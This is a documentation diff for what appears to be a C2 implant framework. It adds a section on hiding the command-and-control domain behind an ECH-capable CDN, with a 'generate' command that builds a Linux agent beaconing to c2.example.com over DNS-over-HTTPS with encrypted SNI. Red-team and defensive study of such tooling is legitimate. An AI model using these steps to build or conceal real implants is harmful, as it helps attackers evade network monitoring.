@@ -225,6 +225,24 @@ nodes) routes through a peer that shares a usable transport instead of assuming
 everyone runs the local default. `smb` is only accepted for Windows payloads;
 kcp/mtls work everywhere.
 
+#### Hiding the C2 name behind a CDN (ECH)
+
+When the C2's TLS is terminated by an ECH-capable CDN edge (for example
+Cloudflare), pass `--doh` and `--ech <c2-domain>` so the agent fetches the
+domain's HTTPS RR and encrypts the inner SNI:
+
+```bash
+generate --type linux_executable --arch amd64 --cc c2.example.com \
+  --doh https://1.1.1.1/dns-query --ech c2.example.com
+```
+
+`--ech` reads the ECHConfigList from the domain's HTTPS RR, so it requires DoH.
+The CDN edge holds the ECH key, and a network observer then sees only the ECH
+public name rather than `c2.example.com`. ECH is mandatory once configured: an
+endpoint that does not support it rejects the handshake, so omit `--ech` unless
+the C2 really is behind an ECH-capable CDN. The CDN2Proxy (`--cdn`) WebSocket
+path tunnels the C2 TLS itself, so ECH does not apply there.
+
 ## Container capabilities
 
 The default container run needs no extra privileges: the client's WireGuard runs
